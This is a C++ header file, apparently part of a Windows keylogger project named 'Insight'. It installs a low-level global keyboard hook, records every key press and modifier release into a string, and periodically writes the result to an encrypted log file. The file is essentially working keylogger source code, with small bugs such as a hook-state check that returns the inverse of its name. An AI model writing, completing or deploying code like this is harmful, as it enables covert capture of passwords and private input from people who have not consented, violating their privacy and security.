#pragma once

#include <iostream>
#include <fstream>
#include <windows.h>
#include "KeyConstants.hpp"
#include "Timer.hpp"
#include "IO.hpp"
#include "MiniLogger.hpp"

namespace Insight {

	std::string keylog = "";
	
	void createLogTimer()
	{
		if (keylog.empty())
			return;

		std::string last_file = IO::writeEncryptedLog(keylog);

		if (last_file.empty())
		{
			MiniLogger::writeToLogFile("File creation was not succesfull. Keylog : " + keylog + "\n");
			return;
		}
	}

	Timer log_timer(createLogTimer, 500 * 60, Timer::Infinite);

	HHOOK eHook = NULL;

	LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
	{
		if (nCode < 0)
			CallNextHookEx(eHook, nCode, wparam, lparam);

		KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;
		if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
		{

			keylog += Keys::KEYS[kbs->vkCode].NAME;
			if (kbs->vkCode == VK_RETURN)
				keylog += '\n';
		}
		else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
		{
			DWORD key = kbs->vkCode;
			if (key == VK_CONTROL
				|| key == VK_LCONTROL
				|| key == VK_RCONTROL
				|| key == VK_SHIFT
				|| key == VK_LSHIFT
				|| key == VK_RSHIFT
				|| key == VK_MENU
				|| key == VK_LMENU
				|| key == VK_RMENU
				|| key == VK_CAPITAL
				|| key == VK_NUMLOCK
				|| key == VK_LWIN
				|| key == VK_RWIN)
			{
				std::string KeyName = Keys::KEYS[kbs->vkCode].NAME;
				KeyName.insert(1, "/");
				keylog += KeyName;
			}
		}
		return CallNextHookEx(eHook, nCode, wparam, lparam);
	}

	bool InstalHook()
	{
		MiniLogger::writeToLogFile("Hook started... Timer started");

		log_timer.Start(true);
		eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);
		return eHook == NULL;
	}

	bool UninstalHook()
	{
		BOOL b = UnhookWindowsHookEx(eHook);
		eHook = NULL;
		return (bool)b;
	}

	bool IsHooked()
	{
		return (bool)(eHook == NULL);
	}
}